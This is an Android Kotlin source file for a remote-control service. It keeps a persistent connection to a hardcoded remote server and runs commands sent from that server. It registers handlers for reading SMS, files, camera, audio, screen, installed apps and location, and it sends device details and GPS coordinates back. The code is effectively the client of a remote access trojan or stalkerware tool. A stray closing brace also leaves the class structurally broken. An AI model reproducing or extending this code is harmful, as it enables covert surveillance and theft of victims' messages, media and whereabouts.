package com.remote.system

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.pm.ServiceInfo
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONException
import org.json.JSONObject
import java.net.URISyntaxException
import io.socket.client.IO
import io.socket.client.Socket

// Define the CommandHandler interface
interface CommandHandler {
    fun execute(params: JSONObject, clientId: String, socket: Socket)
}

class RemoteControlService : Service() {
    // Use camelCase for constant names to avoid warnings
    private val tag = "RemoteControlService"
    private val serverUrl = "https://remote-system.onrender.com/"
    private val notificationId = 1
    private val channelId = "RemoteServiceChannel"
    private val foregroundServiceTypeDataSync = 1

    private var socket: Socket? = null
    private var deviceId: String? = null
    private val commandHandlers = HashMap<String, CommandHandler>()

    override fun onCreate() {
        super.onCreate()
        Log.d(tag, "Service onCreate called")
        initializeCommandHandlers()
        createNotificationChannel()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(notificationId, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(notificationId, createNotification())
            }



        connectToServer()
    }

    private fun initializeCommandHandlers() {
        // Register command handlers
        commandHandlers["get_device_info"] = DeviceInfoCommand()
        commandHandlers["get_app_list"] = AppListCommand(this)
        commandHandlers["get_location"] = LocationCommand()
        commandHandlers["get_wifi_info"] = WiFiInfoCommand(this)
        commandHandlers["get_datetime"] = DateTimeCommand(this)
        commandHandlers["launch_app"] = LaunchAppCommand(this)
        
        // Register SMS command
        commandHandlers["get_sms"] = SmsCommand(this)
        
        // Register File Manager command
        commandHandlers["file_manager"] = FileManagerCommand(this)
        
        // Register Camera command
        commandHandlers["camera"] = CameraCommand(this)
        
        // Register Audio command
        commandHandlers["audio"] = AudioCommand(this)
        
        // NEW: Register Screen command
        commandHandlers["screen"] = ScreenCommand(this)
    }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Remote Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Channel for Remote Control Service"

            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Remote Service")
            .setContentText("Service is running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)

        return builder.build()
    }

    private fun connectToServer() {
        try {
            val options = IO.Options()
            options.reconnection = true
            options.reconnectionDelay = 1000
            options.reconnectionAttempts = Integer.MAX_VALUE

            socket = IO.socket(serverUrl, options)
            setupSocketListeners()
            socket?.connect()
        } catch (e: URISyntaxException) {
            Log.e(tag, "Error connecting to server", e)
        }
    }

    private fun setupSocketListeners() {
        socket?.on(Socket.EVENT_CONNECT) {
            Log.d(tag, "Connected to server")
            socket?.emit("register-device")
        }

        socket?.on("registration-complete") { args ->
            if (args.isNotEmpty() && args[0] is JSONObject) {
                val data = args[0] as JSONObject
                try {
                    deviceId = data.getString("deviceId")
                    Log.d(tag, "Device registered with ID: $deviceId")
                } catch (e: JSONException) {
                    Log.e(tag, "Error parsing registration data", e)
                }
            }
        }

        socket?.on("execute-command") { args ->
            if (args.isNotEmpty() && args[0] is JSONObject) {
                try {
                    val data = args[0] as JSONObject
                    val command = data.getString("command")
                    val clientId = data.getString("clientId")
                    val params = data.optJSONObject("params") ?: JSONObject()

                    executeCommand(command, params, clientId)
                } catch (e: JSONException) {
                    Log.e(tag, "Error parsing command data", e)
                }
            }
        }

        socket?.on(Socket.EVENT_DISCONNECT) {
            Log.d(tag, "Disconnected from server")
        }

        socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
            Log.e(tag, "Socket error: ${if (args.isNotEmpty()) args[0] else "unknown"}")
        }
    }

    private fun executeCommand(command: String, params: JSONObject, clientId: String) {
        Log.d(tag, "Executing command: $command")

        val handler = commandHandlers[command]
        if (handler != null) {
            handler.execute(params, clientId, socket!!)
        } else {
            // Command not recognized
            try {
                val response = JSONObject()
                response.put("success", false)
                response.put("error", "Command not supported")
                response.put("command", command)
                response.put("clientId", clientId)

                socket?.emit("command-response", response)
            } catch (e: JSONException) {
                Log.e(tag, "Error creating error response", e)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
        Log.d(tag, "Service destroyed")
    }

    // Helper method to check permissions - explicitly used in command classes
    private fun checkPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) ==
                PackageManager.PERMISSION_GRANTED
    }

    // Implementation of DeviceInfoCommand
    inner class DeviceInfoCommand : CommandHandler {
        override fun execute(params: JSONObject, clientId: String, socket: Socket) {
            try {
                val data = JSONObject()
                data.put("manufacturer", Build.MANUFACTURER)
                data.put("model", Build.MODEL)
                data.put("device", Build.DEVICE)
                data.put("android_version", Build.VERSION.RELEASE)
                data.put("sdk_level", Build.VERSION.SDK_INT)

                val response = JSONObject()
                response.put("success", true)
                response.put("data", data)
                response.put("command", "get_device_info")
                response.put("clientId", clientId)

                socket.emit("command-response", response)
            } catch (e: Exception) {
                val response = JSONObject()
                response.put("success", false)
                response.put("error", "Failed to get device info: ${e.message}")
                response.put("command", "get_device_info")
                response.put("clientId", clientId)

                socket.emit("command-response", response)
            }
        }
    }

    // Implementation of LocationCommand
    inner class LocationCommand : CommandHandler {
        override fun execute(params: JSONObject, clientId: String, socket: Socket) {
            // Use the checkPermission method
            if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
                !checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {

                val response = JSONObject()
                response.put("success", false)
                response.put("error", "Location permission not granted")
                response.put("command", "get_location")
                response.put("clientId", clientId)

                socket.emit("command-response", response)
                return
            }

            try {
                val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val hasGPS = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
                val hasNetwork = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

                if (!hasGPS && !hasNetwork) {
                    val response = JSONObject()
                    response.put("success", false)
                    response.put("error", "Location services are disabled on device")
                    response.put("command", "get_location")
                    response.put("clientId", clientId)

                    socket.emit("command-response", response)
                    return
                }

                val locationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        val data = JSONObject()
                        data.put("latitude", location.latitude)
                        data.put("longitude", location.longitude)
                        data.put("accuracy", location.accuracy)
                        data.put("provider", location.provider)

                        val response = JSONObject()
                        response.put("success", true)
                        response.put("data", data)
                        response.put("command", "get_location")
                        response.put("clientId", clientId)

                        socket.emit("command-response", response)

                        // Safe check of permission again before removing updates
                        if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) ||
                            checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                            locationManager.removeUpdates(this)
                        }
                    }

                    override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }

                // Request location updates with explicit permission check
                if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                    locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        0, 0f,
                        locationListener
                    )
                } else if (checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        0, 0f,
                        locationListener
                    )
                }

                // Send initial response while waiting for location
                val tempData = JSONObject()
                tempData.put("status", "waiting")
                tempData.put("message", "Getting location...")

                val initialResponse = JSONObject()
                initialResponse.put("success", true)
                initialResponse.put("data", tempData)
                initialResponse.put("command", "get_location")
                initialResponse.put("clientId", clientId)

                socket.emit("command-response", initialResponse)

            } catch (e: Exception) {
                val response = JSONObject()
                response.put("success", false)
                response.put("error", "Error getting location: ${e.message}")
                response.put("command", "get_location")
                response.put("clientId", clientId)

                socket.emit("command-response", response)
            }
        }
    }
}